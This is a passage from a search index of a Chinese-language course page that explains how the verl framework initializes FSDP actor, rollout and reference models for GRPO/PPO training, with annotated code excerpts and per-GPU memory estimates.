\u5b9e\u9645\u7684\u6a21\u578b\u52a0\u8f7d\u5728 init_model() \u4e2d\u8fdb\u884c\uff08\u7531 Ray Trainer \u8c03\u7528\uff09\n</code></pre> <p>\u5173\u952e\u70b9\uff1a - <code>__init__</code> \u4e0d\u52a0\u8f7d\u6a21\u578b\uff0c\u53ea\u521d\u59cb\u5316\u5206\u5e03\u5f0f\u73af\u5883\u548c\u914d\u7f6e - \u6a21\u578b\u52a0\u8f7d\u5728 <code>init_model()</code> \u4e2d\uff08\u7a0d\u540e\u8c03\u7528\uff09 - \u6b64\u65f6\u663e\u5b58\u5360\u7528\uff1a~0GB\uff08\u4ec5\u5206\u5e03\u5f0f\u521d\u59cb\u5316\u5f00\u9500 ~100MB\uff09</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#32-init_model-","title":"3.2 <code>init_model()</code> - \u6a21\u578b\u521d\u59cb\u5316\u5165\u53e3","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:760-820</code></p> <p>Ray Trainer \u8c03\u7528 <code>init_model()</code> \u540e\uff0c\u624d\u771f\u6b63\u52a0\u8f7d\u6a21\u578b\uff1a</p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:760-820\n\n@register(dispatch_mode=Dispatch.ONE_TO_ALL)\ndef init_model(self):\n    \"\"\"\u521d\u59cb\u5316 Actor/Rollout/Ref \u4e09\u4e2a\u6a21\u578b\uff08FSDP \u8bad\u7ec3\u6838\u5fc3\uff09\"\"\"\n\n    # ========== \u6b65\u9aa4 1: \u52a0\u8f7d Actor FSDP \u6a21\u578b\uff08\u7528\u4e8e\u8bad\u7ec3\uff09==========\n    if self._is_actor:\n        self.actor_module_fsdp, self.actor_optimizer, ... = self._build_model_optimizer(\n            model_path=self.config.actor.model.path,  # \u5982 \"Qwen/Qwen3-8B\"\n            fsdp_config=self.config.actor,\n            role=\"actor\",\n        )\n        # \u2193 \u8be6\u7ec6\u6d41\u7a0b\u89c1 3.3 \u8282\n\n    # ========== \u6b65\u9aa4 2: \u52a0\u8f7d Rollout \u6a21\u578b\uff08\u7528\u4e8e\u63a8\u7406\uff09==========\n    if self._is_rollout:\n        self.rollout = self._build_rollout()\n        # \u2193 \u8be6\u7ec6\u6d41\u7a0b\u89c1 3.4 \u8282\n\n    # ========== \u6b65\u9aa4 3: \u52a0\u8f7d Reference \u6a21\u578b\uff08\u5982\u679c\u9700\u8981\uff09==========\n    if self._is_ref:\n        self.ref_module_fsdp = self._build_model_optimizer(\n            model_path=self.config.ref.model.path,\n            fsdp_config=self.config.ref,\n            role=\"ref\",\n        )\n\n    # ========== \u6b65\u9aa4 4: \u914d\u7f6e FSDP state_dict \u7c7b\u578b ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:634-644\n    if torch.distributed.get_world_size() == 1:\n        FSDP.set_state_dict_type(\n            self.actor_module_fsdp,\n            state_dict_type=StateDictType.FULL_STATE_DICT,\n        )\n    else:\n        FSDP.set_state_dict_type(\n            self.actor_module_fsdp,\n            state_dict_type=StateDictType.SHARDED_STATE_DICT,  # \u2190 \u591a GPU \u4f7f\u7528\u5206\u7247\n        )\n\n    # ========== \u6b65\u9aa4 5: \u5207\u6362\u5230 Trainer \u6a21\u5f0f\uff08\u521d\u59cb\u72b6\u6001\uff09==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:650-656\n    if rollout_config.mode == \"sync\" and self._is_actor:\n        loop = asyncio.get_event_loop()\n        loop.run_until_complete(self.trainer_mode())\n        # \u2193 \u5207\u6362\u5230 Trainer \u6a21\u5f0f\uff08\u91ca\u653e KV Cache\uff09\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#33-_build_model_optimizer-actor-fsdp","title":"3.3 <code>_build_model_optimizer()</code> - Actor FSDP \u6a21\u578b\u52a0\u8f7d","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:268-589</code></p> <p>\u6838\u5fc3\u95ee\u9898\uff1a\u663e\u5b58\u4e2d\u662f\u5426\u540c\u65f6\u5b58\u5728\u4e24\u4efd\u6a21\u578b\u6743\u91cd\uff1f</p> <p>\u7b54\u6848\uff1a\u662f\u7684\uff01\u5728 FSDP \u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\uff0c\u663e\u5b58\u4e2d\u77ed\u6682\u5b58\u5728\u4e24\u4efd\u5b8c\u6574\u6743\u91cd\uff1a</p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:268-589\n\ndef _build_model_optimizer(self, model_path, fsdp_config, role=\"actor\"):\n    \"\"\"\u6784\u5efa FSDP \u6a21\u578b\u548c\u4f18\u5316\u5668\"\"\"\n\n    # ========== \u6b65\u9aa4 1: \u52a0\u8f7d Tokenizer ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:304-311\n    self.tokenizer = hf_tokenizer(local_path, trust_remote_code=True)\n    self.processor = hf_processor(local_path, trust_remote_code=True)\n\n    # ========== \u6b65\u9aa4 2: \u786e\u5b9a\u6a21\u578b dtype ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:314-320\n    torch_dtype = torch.float32 if self._is_actor else torch.bfloat16\n    # Actor: fp32\uff08\u907f\u514d\u4f18\u5316\u5668\u5728 bf16\uff0c\u5f71\u54cd\u8bad\u7ec3\u7a33\u5b9a\u6027\uff09\n    # Ref: bf16\uff08\u8282\u7701\u663e\u5b58\uff0c\u63a8\u7406\u4e0d\u9700\u8981\u9ad8\u7cbe\u5ea6\uff09\n\n    # ========== \u6b65\u9aa4 3: \u52a0\u8f7d\u6a21\u578b\u914d\u7f6e ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:323-346\n    actor_model_config = AutoConfig.from_pretrained(\n        local_path,\n        trust_remote_code=trust_remote_code,\n        attn_implementation=\"flash_attention_2\"\n    )\n\n    # ========== \u6b65\u9aa4 4: \u521d\u59cb\u5316\u6a21\u578b\uff08\u4f7f\u7528 meta tensor \u6216\u76f4\u63a5\u521d\u59cb\u5316\uff09==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:348-389\n    init_context = get_init_weight_context_manager(\n        use_meta_tensor=not actor_model_config.tie_word_embeddings,\n        mesh=self.device_mesh\n    )\n    # Meta tensor: \u5ef6\u8fdf\u521d\u59cb\u5316\uff08\u4e0d\u5360\u7528\u663e\u5b58\uff09\n    # \u5982\u679c tie_word_embeddings=True\uff0c\u5219\u76f4\u63a5\u521d\u59cb\u5316\uff08\u5360\u7528\u663e\u5b58\uff09\n\n    with init_context():\n        # \u52a0\u8f7d\u9884\u8bad\u7ec3\u6a21\u578b\uff08\u4ece\u78c1\u76d8\u8bfb\u53d6\u6743\u91cd\uff09\n        actor_module = AutoModelForCausalLM.from_pretrained(\n            pretrained_model_name_or_path=local_path,\n            torch_dtype=torch_dtype,  # fp32 (Actor) \u6216 bf16 (Ref)\n            config=actor_model_config,\n            trust_remote_code=trust_remote_code,\n        )\n\n    # ========== \u5173\u952e\u65f6\u523b\uff1a\u663e\u5b58\u4e2d\u6709\u5b8c\u6574\u7684\u6a21\u578b\u6743\u91cd ==========\n    # \u6b64\u65f6\u6bcf\u4e2a GPU \u90fd\u52a0\u8f7d\u4e86\u5b8c\u6574\u7684 8B \u53c2\u6570\uff0832GB\uff0cfp32 \u683c\u5f0f\uff09\n    # \u663e\u5b58\u5360\u7528\uff1a32GB / GPU\n\n    # ========== \u6b65\u9aa4 5: \u5e94\u7528\u4f18\u5316\uff08Liger/Monkey Patch/Gradient Checkpointing/LoRA\uff09==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:392-432\n    if use_liger:\n        _apply_liger_kernel_to_instance(model=actor_module)  # \u4f18\u5316\u5185\u6838\n\n    apply_monkey_patch(  # \u6ce8\u5165\u81ea\u5b9a\u4e49 forward\n        model=actor_module,\n        use_remove_padding=use_remove_padding,\n        ulysses_sp_size=self.ulysses_sequence_parallel_size,\n    )\n\n    if enable_gradient_checkpointing:\n        actor_module.gradient_checkpointing_enable()  # \u7701\u663e\u5b58\uff08recompute\uff09\n\n    if self._is_lora:\n        actor_module = get_peft_model(actor_module, LoraConfig(...))  # LoRA \u9002\u914d\n\n    # ========== \u6b65\u9aa4 6: FSDP \u521d\u59cb\u5316\uff08\u5173\u952e\uff01\uff09==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:447-540\n    torch.distributed.barrier()  # \u540c\u6b65\u6240\u6709 GPU\n\n    # \u83b7\u53d6 FSDP \u914d\u7f6e\n    auto_wrap_policy = get_fsdp_wrap_policy(module=actor_module, config=fsdp_config)\n    sharding_strategy = ShardingStrategy.FULL_SHARD  # ZeRO-3\n    mixed_precision = MixedPrecision(...)  # bf16 \u8ba1\u7b97, fp32 reduce\n\n    fsdp_strategy = self.config.actor.strategy\n    if fsdp_strategy == \"fsdp\":\n        # ========== FSDP1\uff08PyTorch &lt; 2.4\uff09==========\n        # \u6587\u4ef6: verl/workers/fsdp_workers.py:497-507\n        actor_module_fsdp = FSDP(\n            actor_module,  # \u8f93\u5165\uff1a\u5b8c\u6574\u6a21\u578b\uff0832GB\uff09\n            cpu_offload=None if role == \"actor\" else CPUOffload(offload_params=True),\n            param_init_fn=init_fn,\n            auto_wrap_policy=auto_wrap_policy,  # \u6309\u5c42\u5305\u88c5\n            device_id=get_device_id(),\n            sharding_strategy=sharding_strategy,  # ZeRO-3\n            mixed_precision=mixed_precision,     # bf16 \u8ba1\u7b97\n            sync_module_states=True,             # \u2190 \u5173\u952e\uff1a\u540c\u6b65\u521d\u59cb\u5316\u72b6\u6001\n            device_mesh=self.device_mesh,\n        )\n        # \u2193 FSDP \u5185\u90e8\u6267\u884c\uff1a\n        # 1. \u5c06\u5b8c\u6574\u6a21\u578b\uff0832GB\uff09\u5206\u7247\u4e3a 8 \u4efd\uff08\u6bcf\u4efd 4GB\uff09\n        # 2. All-Reduce \u540c\u6b65\u53c2\u6570\uff08\u786e\u4fdd\u6240\u6709 GPU \u7684\u521d\u59cb\u53c2\u6570\u4e00\u81f4\uff09\n        # 3. \u91ca\u653e\u672c\u5730\u5b8c\u6574\u53c2\u6570\uff0c\u53ea\u4fdd\u7559\u5206\u7247\uff084GB\uff09\n        # 4. \u8f6c\u6362\u4e3a bf16 \u2192 \u5206\u7247\u4ece 4GB \u964d\u5230 2GB\n        #\n        # \u663e\u5b58\u53d8\u5316\uff1a\n        # - \u521d\u59cb\u5316\u524d\uff1a32GB\uff08fp32 \u5b8c\u6574\u6a21\u578b\uff09\n        # - FSDP \u4e2d\uff1a32GB (\u539f\u6a21\u578b) + 2GB (\u5206\u7247) = 34GB\uff08\u5cf0\u503c\uff09\n        # - \u521d\u59cb\u5316\u540e\uff1a2GB\uff08bf16 \u5206\u7247\uff0c\u539f\u6a21\u578b\u88ab\u91ca\u653e\uff09\n\n    elif fsdp_strategy == \"fsdp2\":\n        # ========== FSDP2\uff08PyTorch &gt;= 2.4\uff09==========\n        # \u6587\u4ef6: verl/workers/fsdp_workers.py:509-532\n        fsdp_kwargs = {\n            \"mesh\": fsdp_mesh,\n            \"mp_policy\": mp_policy,\n            \"offload_policy\": cpu_offload,\n            \"reshard_after_forward\": fsdp_config.reshard_after_forward,\n        }\n        # \u5148\u83b7\u53d6\u5b8c\u6574\u53c2\u6570\n        full_state = actor_module.state_dict()  # 32GB\uff08fp32\uff09\n        # \u5e94\u7528 FSDP2\uff08in-place \u8f6c\u6362\uff09\n        apply_fsdp2(actor_module, fsdp_kwargs, fsdp_config)\n        # \u52a0\u8f7d\u53c2\u6570\u5230\u5206\u7247\u6a21\u578b\n        fsdp2_load_full_state_dict(actor_module, full_state, fsdp_mesh, cpu_offload)\n        # \u91ca\u653e full_state\n        del full_state\n\n        # \u663e\u5b58\u53d8\u5316\uff1a\n        # - \u521d\u59cb\u5316\u524d\uff1a32GB\uff08fp32 \u5b8c\u6574\u6a21\u578b\uff09\n        # - FSDP2 \u4e2d\uff1a32GB (\u539f\u6a21\u578b) + 32GB (full_state) = 64GB\uff08\u5cf0\u503c\uff09\n        # - \u521d\u59cb\u5316\u540e\uff1a2GB\uff08bf16 \u5206\u7247\uff09\n\n    log_gpu_memory_usage(f\"After {role} FSDP init\", logger=logger)\n    # \u6b64\u65f6\u663e\u5b58\uff1a~2GB (\u53c2\u6570\u5206\u7247)\n\n    # ========== \u6b65\u9aa4 7: \u521b\u5efa\u4f18\u5316\u5668\uff08\u4ec5 Actor\uff09==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:542-589\n    if role == \"actor\":\n        actor_optimizer = optim.AdamW(\n            actor_module_fsdp.parameters(),\n            lr=optim_config.lr,\n            betas=(0.9, 0.999),\n            weight_decay=0.01,\n        )\n        # \u4f18\u5316\u5668\u72b6\u6001\uff08momentum + variance\uff09\uff1a2GB + 2GB = 4GB\n\n        actor_lr_scheduler = get_lr_scheduler(...)\n\n    return actor_module_fsdp, actor_optimizer, actor_lr_scheduler, actor_model_config\n\n# ========== \u663e\u5b58\u5360\u7528\u603b\u7ed3 ==========\n# \u521d\u59cb\u5316\u5cf0\u503c\uff08FSDP1\uff09: 34GB\uff08fp32 \u5b8c\u6574\u6a21\u578b + bf16 \u5206\u7247\uff09\n# \u521d\u59cb\u5316\u5cf0\u503c\uff08FSDP2\uff09: 64GB\uff08fp32 \u5b8c\u6574\u6a21\u578b + fp32 full_state\uff09\n# \u521d\u59cb\u5316\u540e\u7a33\u5b9a: 2GB\uff08bf16 \u5206\u7247\uff09 + 4GB\uff08\u4f18\u5316\u5668\uff09 = 6GB\n</code></pre> <p>\u5173\u952e\u53d1\u73b0\uff1a</p> <ol> <li>\u662f\u7684\uff0c\u663e\u5b58\u4e2d\u77ed\u6682\u5b58\u5728\u4e24\u4efd\u6a21\u578b\u6743\u91cd\uff1a</li> <li>FSDP \u521d\u59cb\u5316\u524d\uff1a\u5b8c\u6574\u6a21\u578b\uff0832GB fp32\uff09</li> <li>FSDP \u521d\u59cb\u5316\u4e2d\uff1a\u5b8c\u6574\u6a21\u578b + \u5206\u7247\u6a21\u578b\uff0834-64GB \u5cf0\u503c\uff09</li> <li> <p>FSDP \u521d\u59cb\u5316\u540e\uff1a\u4ec5\u5206\u7247\u6a21\u578b\uff082GB bf16\uff09</p> </li> <li> <p>FSDP \u521d\u59cb\u5316\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:497-507</code> (FSDP1) \u6216 <code>530-532</code> (FSDP2)</p> </li> <li> <p>sync_module_states=True \u7684\u4f5c\u7528\uff1a</p> </li> <li>\u5728 FSDP \u521d\u59cb\u5316\u65f6\uff0c\u6240\u6709 GPU \u7684\u53c2\u6570\u5fc5\u987b\u4e00\u81f4</li> <li><code>sync_module_states=True</code> \u786e\u4fdd rank 0 \u7684\u53c2\u6570\u5e7f\u64ad\u5230\u6240\u6709 GPU</li> <li>\u8fd9\u662f\u5206\u5e03\u5f0f\u8bad\u7ec3\u7684\u5fc5\u8981\u6b65\u9aa4</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#34-_build_rollout-rollout","title":"3.4 <code>_build_rollout()</code> - Rollout \u6a21\u578b\u52a0\u8f7d","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:591-630</code></p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:591-630\n\ndef _build_rollout(self):\n    \"\"\"\u6784\u5efa Rollout \u6a21\u578b\uff08vLLM/SGLang\uff09\"\"\"\n\n    # ========== \u6b65\u9aa4 1: \u521b\u5efa Rollout Device Mesh ==========\n    rollout_device_mesh = init_device_mesh(\n        get_device_name(),\n        mesh_shape=(self.world_size,),\n        mesh_dim_names=(\"rollout\",)\n    )\n\n    # ========== \u6b65\u9aa4 2: \u521b\u5efa Rollout Engine ==========\n    rollout_config = self.config.rollout\n    self.rollout = get_rollout_class(rollout_config.name, rollout_config.mode)(\n        config=rollout_config,\n        model_config=model_config,\n        device_mesh=rollout_device_mesh\n    )\n    # \u2192 \u5185\u90e8\u8c03\u7528 vLLM \u6216 SGLang \u521d\u59cb\u5316\n    # \u2192 \u4ece\u78c1\u76d8\u52a0\u8f7d\u5b8c\u6574\u6a21\u578b\uff0816GB bf16\uff09\n    # \u2192 \u5206\u914d KV Cache\uff0832GB\uff09\n\n    log_gpu_memory_usage(f\"After building {rollout_config.name} rollout\", logger=logger)\n    # \u6b64\u65f6\u663e\u5b58\uff1a16GB (\u53c2\u6570) + 32GB (KV Cache) = 48GB\n\n    return self.rollout\n\n# ========== Rollout \u6a21\u578b\u7279\u70b9 ==========\n# - \u5b8c\u6574\u6a21\u578b\uff08\u4e0d\u5206\u7247\uff09\uff1a16GB\uff08bf16\uff09\n# - KV Cache\uff1a32GB\uff08\u52a8\u6001\u5206\u914d\uff09\n# - \u4e0e Actor FSDP \u5171\u5b58\uff1a\u540c\u4e00 GPU \u4e0a\n</code></pre> <p>\u5173\u952e\u70b9\uff1a - Rollout \u6a21\u578b\u4e0d\u4f7f\u7528 FSDP\uff0c\u662f\u5b8c\u6574\u6a21\u578b - \u76f4\u63a5\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230 GPU\uff0816GB\uff09 - \u4e0e Actor FSDP \u6a21\u578b\u5171\u4eab\u540c\u4e00 GPU</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#35","title":"3.5 \u521d\u59cb\u5316\u540e\u7684\u6a21\u5f0f\u72b6\u6001","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:650-656</code></p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:650-656\n\n# 5. switch to trainer mode\n# NOTE: It's critical that hybrid engine in trainer mode initially to load checkpoint.\nif rollout_config.mode == \"sync\" and self._is_actor:\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(self.trainer_mode())\n    # \u2193 \u5207\u6362\u5230 Trainer \u6a21\u5f0f\n</code></pre> <p>\u521d\u59cb\u5316\u5b8c\u6574\u6d41\u7a0b\uff1a</p> <pre><code>1. __init__() \u2192 \u521d\u59cb\u5316\u5206\u5e03\u5f0f\u73af\u5883\uff08~100MB\uff09\n   \u2193\n2. init_model() \u2192 \u8c03\u7528 _build_model_optimizer()\n   \u2193\n3. _build_model_optimizer():\n   \u251c\u2500\u2500 \u52a0\u8f7d\u5b8c\u6574 Actor \u6a21\u578b\uff0832GB fp32\uff09\n   \u251c\u2500\u2500 FSDP \u521d\u59cb\u5316\uff08\u5cf0\u503c 34-64GB\uff09\n   \u251c\u2500\u2500 \u91ca\u653e\u5b8c\u6574\u6a21\u578b\uff0c\u4fdd\u7559\u5206\u7247\uff082GB bf16\uff09\n   \u2514\u2500\u2500 \u521b\u5efa\u4f18\u5316\u5668\uff084GB\uff09\n   \u2193 \u6b64\u65f6\u663e\u5b58\uff1a6GB\n\n4. _build_rollout():\n   \u251c\u2500\u2500 \u52a0\u8f7d Rollout \u6a21\u578b\uff0816GB bf16\uff09\n   \u2514\u2500\u2500 \u5206\u914d KV Cache\uff0832GB\uff09\n   \u2193 \u6b64\u65f6\u663e\u5b58\uff1a6GB + 48GB = 54GB\n\n5. trainer_mode():\n   \u251c\u2500\u2500 \u91ca\u653e KV Cache\uff08-32GB\uff09\n   \u2514\u2500\u2500 \u4fdd\u7559 Rollout \u53c2\u6570\uff0816GB\uff09\n   \u2193 \u6700\u7ec8\u663e\u5b58\uff1a6GB + 16GB = 22GB\n</code></pre> <p>\u521d\u59cb\u5316\u540e\u7684\u663e\u5b58\u5360\u7528\uff08\u6bcf\u4e2a GPU\uff09\uff1a</p> <pre><code>GPU 0 (Trainer Mode):\n\u251c\u2500\u2500 Actor FSDP \u53c2\u6570\u5206\u7247: 2GB (bf16)\n\u251c\u2500\u2500 Actor \u4f18\u5316\u5668\u72b6\u6001: 4GB (fp32)\n\u251c\u2500\u2500 Rollout \u53c2\u6570\uff08\u5b8c\u6574\uff09: 16GB (bf16)\n\u251c\u2500\u2500 Rollout KV Cache: 0GB (\u5df2\u91ca\u653e)\n\u2514\u2500\u2500 \u603b\u8ba1: ~22GB / 80GB\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#32","title":"3.2 \u521d\u59cb\u5316\u540e\u7684\u6a21\u5f0f\u72b6\u6001","text":"<p>\u5173\u952e\u70b9\uff1a\u521d\u59cb\u5316\u540e\uff0c\u7cfb\u7edf\u5904\u4e8e Trainer Mode\uff0c\u800c\u4e0d\u662f Rollout Mode\uff01</p> <p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:650-656</code></p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:650-656\n\n# 5. switch to trainer mode\n# NOTE: It's critical that hybrid engine in trainer mode initially to load checkpoint.\n# For sync mode, we directly switch to trainer mode here.\n# For async mode, we can't call run_until_complete here, so we will switch to trainer mode in AgentLoopManager.\nif rollout_config.mode == \"sync\" and self._is_actor:\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(self.trainer_mode())  # \u2190 \u8fd9\u91cc\u5207\u6362\u5230 Trainer Mode\n</code></pre> <p>\u521d\u59cb\u5316\u6d41\u7a0b\uff1a</p> <pre><code>1. _build_model_optimizer() \u2192 Actor FSDP \u52a0\u8f7d\uff082GB \u53c2\u6570\u5206\u7247 + 4GB \u4f18\u5316\u5668\uff09\n2. _build_rollout() \u2192 Rollout \u6a21\u578b\u52a0\u8f7d\uff0816GB \u5b8c\u6574\u53c2\u6570 + 32GB KV Cache\uff09\n   \u2193 \u6b64\u65f6\u663e\u5b58: ~54GB\n3. trainer_mode() \u88ab\u8c03\u7528:\n   \u2193 rollout.release() \u91ca\u653e KV Cache\uff08-32GB\uff09\n   \u2193 \u6b64\u65f6\u663e\u5b58: ~22GB\n4. \u521d\u59cb\u5316\u5b8c\u6210\uff0c\u7cfb\u7edf\u5904\u4e8e Trainer Mode\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u521d\u59cb\u5316\u540e\u8981\u5207\u6362\u5230 Trainer Mode\uff1f</p> <p>\u6839\u636e\u4ee3\u7801\u6ce8\u91ca\uff1a</p> <p>It's critical that hybrid engine in trainer mode initially to load checkpoint.</p> <p>\u539f\u56e0\uff1a 1. \u52a0\u8f7d checkpoint \u65f6\u9700\u8981 Actor FSDP \u5728 GPU\uff08\u7528\u4e8e\u52a0\u8f7d\u53c2\u6570\uff09 2. Rollout KV Cache \u5728\u521d\u59cb\u5316\u65f6\u4f1a\u5360\u7528\u5927\u91cf\u663e\u5b58\uff0c\u9700\u8981\u91ca\u653e 3. \u8bad\u7ec3\u5f00\u59cb\u524d\u53ef\u80fd\u9700\u8981\u6267\u884c\u9a8c\u8bc1\uff08validation\uff09\uff0c\u9700\u8981 Trainer Mode</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#4-ppo","title":"4. PPO \u5b8c\u6574\u8bad\u7ec3\u8fed\u4ee3\u6d41\u7a0b","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#41","title":"4.1 \u8bad\u7ec3\u5faa\u73af\u5165\u53e3","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/trainer/ppo/ray_trainer.py:962-1259</code></p> <pre><code># \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:962-1259\n\ndef fit(self):\n    \"\"\"\n    The training loop of PPO.\n    The driver process only need to call the compute functions of the worker group through RPC\n    to construct the PPO dataflow.\n    The light-weight advantage computation is done on the driver process.\n    \"\"\"\n\n    for epoch in range(self.config.trainer.total_epochs):\n        for batch_dict in self.train_dataloader:\n            # ========== \u9636\u6bb5 1: \u751f\u6210\u5e8f\u5217\uff08Rollout Phase\uff09==========\n            gen_batch_output = self.actor_rollout_wg.generate_sequences(gen_batch)\n\n            # ========== \u9636\u6bb5 2: \u8ba1\u7b97 Reward\uff08TaskRunner CPU\uff09==========\n            reward_tensor, reward_extra_infos = compute_reward(batch, self.reward_fn)\n\n            # ========== \u9636\u6bb5 3: \u8ba1\u7b97 Old Log Prob\uff08Actor FSDP\uff09==========\n            old_log_prob = self.actor_rollout_wg.compute_log_prob(batch)\n\n            # ========== \u9636\u6bb5 4: \u8ba1\u7b97 Advantage\uff08TaskRunner CPU\uff09==========\n            batch = compute_advantage(batch, adv_estimator=\"grpo\", ...)\n\n            # ========== \u9636\u6bb5 5: \u66f4\u65b0 Actor \u6a21\u578b\uff08FSDP \u8bad\u7ec3\uff09==========\n            actor_output = self.actor_rollout_wg.update_actor(batch)\n\n            # \u4e0b\u4e00\u8f6e\u8fed\u4ee3...\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#42-1rollout-phase","title":"4.2 \u9636\u6bb5 1\uff1a\u751f\u6210\u5e8f\u5217\uff08Rollout Phase\uff09","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a - \u8c03\u7528\u5165\u53e3\uff1a<code>verl/trainer/ppo/ray_trainer.py:1042-1050</code> - Worker \u5b9e\u73b0\uff1a<code>verl/workers/fsdp_workers.py:927-984</code></p> <pre><code># ========== TaskRunner \u8c03\u7528 ==========\n# \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:1042-1050\n\ngen_batch_output = self.actor_rollout_wg.generate_sequences(gen_batch)\n\n\n# ========== \u5728\u6bcf\u4e2a GPU Worker \u4e2d\u6267\u884c ==========\n# \u6587\u4ef6: verl/workers/fsdp_workers.py:927-984\n\n@register(dispatch_mode=make_nd_compute_dataproto_dispatch_fn(mesh_name=\"rollout\"))\n@DistProfiler.annotate(color=\"red\", role=\"rollout_generate\")\ndef generate_sequences(self, prompts: DataProto):\n    \"\"\"\u751f\u6210\u5e8f\u5217\uff08Rollout \u9636\u6bb5\uff09\"\"\"\n\n    # ========== \u6b65\u9aa4 1.1: \u5207\u6362\u5230 Rollout \u6a21\u5f0f ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:945-950\n    if self._is_actor:  # For rollout only, we do not switch context.\n        loop = asyncio.get_event_loop()\n        loop.run_until_complete(self.rollout_mode())  # \u2190 \u5207\u6362\u5230 Rollout Mode\n        # \u2192 Actor \u6743\u91cd\u540c\u6b65\u5230 Rollout Engine\n        # \u2192 Actor \u6a21\u578b offload \u5230 CPU\uff08\u5982\u679c\u914d\u7f6e\u4e86\uff09\n        log_gpu_memory_usage(\"After switch to rollout mode\", logger=logger)\n\n    # ========== \u6b65\u9aa4 1.2: \u4f7f\u7528 Rollout \u63a8\u7406 ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:952-957\n    with simple_timer(\"generate_sequences\", timing_generate):\n        output = self.rollout.generate_sequences(prompts=prompts)\n        # \u2192 vLLM/SGLang \u6267\u884c\u63a8\u7406\n        # \u2192 \u8fd4\u56de\uff1asequences, token_level_scores, ...\n\n    # ========== \u6b65\u9aa4 1.3: \u5207\u6362\u56de Trainer \u6a21\u5f0f ==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:960-964\n    if self._is_actor:\n        loop.run_until_complete(self.trainer_mode())  # \u2190 \u5207\u6362\u56de Trainer Mode\n        # \u2192 Rollout Engine offload\n        # \u2192 Actor \u6a21\u578b\u52a0\u8f7d\u56de GPU\n        log_gpu_memory_usage(\"After switch to trainer mode\", logger=logger)\n\n    return output\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#43-2-rewardtaskrunner-cpu","title":"4.3 \u9636\u6bb5 2\uff1a\u8ba1\u7b97 Reward\uff08TaskRunner CPU\uff09","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/trainer/ppo/ray_trainer.py:1088-1098</code></p> <pre><code># \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:1088-1098\n\n# ========== \u5728 TaskRunner\uff08CPU\uff09\u4e2d\u8ba1\u7b97 Reward ==========\n# \u5bf9\u4e8e GRPO\uff0c\u4f7f\u7528\u89c4\u5219 Reward\uff08\u5982 GSM8K \u7b54\u6848\u5339\u914d\uff09\n\nwith marked_timer(\"reward\", timing_raw, color=\"yellow\"):\n    # compute reward model score\n    if self.use_rm and \"rm_scores\" not in batch.batch.keys():\n        reward_tensor = self.rm_wg.compute_rm_score(batch)\n        batch = batch.union(reward_tensor)\n\n    if self.config.reward_model.launch_reward_fn_async:\n        future_reward = compute_reward_async.remote(data=batch, reward_fn=self.reward_fn)\n    else:\n        reward_tensor, reward_extra_infos_dict = compute_reward(batch, self.reward_fn)\n\n# \u4e0d\u9700\u8981\u6a21\u5f0f\u5207\u6362\n# \u4e0d\u5360\u7528 GPU 